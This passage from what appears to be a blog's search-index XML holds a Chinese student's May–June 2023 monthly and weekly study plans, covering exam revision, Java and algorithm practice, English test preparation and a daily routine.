<li>ai绘图<ol>
<li>尝试了需要英伟达的显卡</li>
</ol>
</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>刷马哲和毛概</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>刷马哲和毛概大题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>科研任务</li>
<li>或者学校作业</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>java的学习</li>
<li></li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.05.MonthPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.05.MonthPlan/</url>
    <content><![CDATA[<h1 id="2023-5月计划"><a href="#2023-5月计划" class="headerlink" title="2023.5月计划"></a>2023.5月计划</h1><h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><ol>
<li><p>容易被一个任务，带偏掉整体的进度</p>
</li>
<li><p>做事情还是要先有规划，这样做事效率会比较高</p>
</li>
<li></li>
<li></li>
</ol>
<h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><ol>
<li>项目</li>
<li>科研</li>
<li>算法</li>
<li>英语</li>
</ol>
<h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="数学-x2F-科研"><a href="#数学-x2F-科研" class="headerlink" title="数学&#x2F;科研"></a>数学&#x2F;科研</h3><ol>
<li>要把综述大致看完<ol>
<li>不求甚解</li>
<li>了解大致的方法就好了</li>
</ol>
</li>
<li>工具变量的学习</li>
<li>下载代码</li>
<li>下载数据库</li>
<li>完成ppt</li>
</ol>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ol>
<li>本月至少完成动态规划的刷题</li>
<li>可以完成一部分搜索的题目</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>写作的专项练习</li>
<li>单词</li>
</ol>
<h3 id="计算机-x2F-编程"><a href="#计算机-x2F-编程" class="headerlink" title="计算机&#x2F;编程"></a>计算机&#x2F;编程</h3><ol>
<li>完成数据库课程设计</li>
<li>学习java前8个阶段的内容</li>
<li>完成一个项目</li>
<li>巩固知识</li>
<li>并且学习团队协作的知识</li>
<li>等6月份将java进度推到第12阶段</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.06.1st.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.06.1st.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-06-第一周计划"><a href="#2023-06-第一周计划" class="headerlink" title="2023.06.第一周计划"></a>2023.06.第一周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li>思考一下深度思考</li>
<li>如何将深度思考运用到生活中</li>
<li>可以提高一下自己的写作能力</li>
<li>可以进行适当的博客写作，提高自己的表达能力</li>
<li>思考期末考试如何复习<ol>
<li>期末考试的安排策略</li>
</ol>
</li>
<li>每天无论多忙，还是要把晚上的总结时间进行下去</li>
<li>最近就处在想要改变自己，但是却又</li>
<li>要考虑一下是考雅思还是托福</li>
<li>重新思考一下java和C++</li>
<li>要不要搞大创</li>
<li>现在存在的问题</li>
<li>总结的经验没办法，总结到一起，这个只和日期有关</li>
<li>发现问题，分析<del>，解决</del>，方法优缺点，总结经验，未来</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>全力准备期末考试复习</li>
<li>把该写的报告全部写完</li>
<li>先把马哲和毛概复习完成</li>
<li>在准备离散</li>
<li>这周这里数据库和计网题库 </li>
<li>下周开始准备计网和数据库</li>
<li></li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><p>1. </p>
<p>   1. </p>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><p>1. </p>
<p>2. </p>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>1. </p>
<p>2. </p>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><p>1. </p>
<p>2. </p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>刷马哲和毛概</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>刷马哲和毛概大题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>科研任务</li>
<li>或者学校作业</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>java的学习</li>
<li></li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.06.2nd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.06.2nd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-06-第二周计划"><a href="#2023-06-第二周计划" class="headerlink" title="2023.06.第二周计划"></a>2023.06.第二周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li>进行早睡</li>
<li>手机不要带上床</li>
<li>12:00准时上床睡觉</li>
<li>以后面对一下要背书的考试都是，先过一下知识点<ol>
<li>然后考前3、4天集中突击大题</li>
</ol>
</li>
<li>可以开始规划考研的复习计划</li>
<li>英语要准备一下雅思</li>
<li>软考想一下</li>
<li>要开始准备备考考研</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>准备期末考试</li>
<li>修改一下实验报告</li>
<li>看有没有时间抽空学一下其他内容</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><p>1. </p>
<p>   1. </p>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><p>1. </p>
<p>2. </p>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>1. </p>
<p>2. </p>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><p>1. </p>
<p>2. </p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>刷马哲和毛概</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>刷马哲和毛概大题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>科研任务</li>
<li>或者学校作业</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>java的学习</li>
<li></li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.06.MonthPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.06.MonthPlan/</url>
    <content><![CDATA[<h1 id="2023-6月计划"><a href="#2023-6月计划" class="headerlink" title="2023.6月计划"></a>2023.6月计划</h1><h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><ol>
<li><p>容易被一个任务，带偏掉整体的进度</p>
</li>
<li><p>做事情还是要先有规划，这样做事效率会比较高</p>
</li>
<li><p>需要要注意系统性</p>
</li>
<li></li>
<li></li>
</ol>
<h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><ol>
<li>这个月的主要任务</li>
<li>准备期末考试</li>
<li>这个学习的科研任务</li>
<li>java技能<ol>
<li>争取在六月中旬之前完成学习</li>
</ol>
</li>
<li>暑假实习的安排<ol>
<li>要在六月中旬开始安排了</li>
</ol>
</li>
<li>期末复习<ol>
<li>要在中旬以后全面开始准备，直到最后一科考完</li>
</ol>
</li>
</ol>
<h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="数学-x2F-科研"><a href="#数学-x2F-科研" class="headerlink" title="数学&#x2F;科研"></a>数学&#x2F;科研</h3><ol>
<li>要将这个学期的科研任务完成</li>
</ol>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ol>
<li>算法的话每天刷一题即可</li>
<li>要缩短一下时间，进行其他内容的学习</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>写作的专项练习</li>
<li>单词</li>
</ol>
<h3 id="计算机-x2F-编程"><a href="#计算机-x2F-编程" class="headerlink" title="计算机&#x2F;编程"></a>计算机&#x2F;编程</h3><ol>
<li>将java学习到第12个阶段</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
</search>
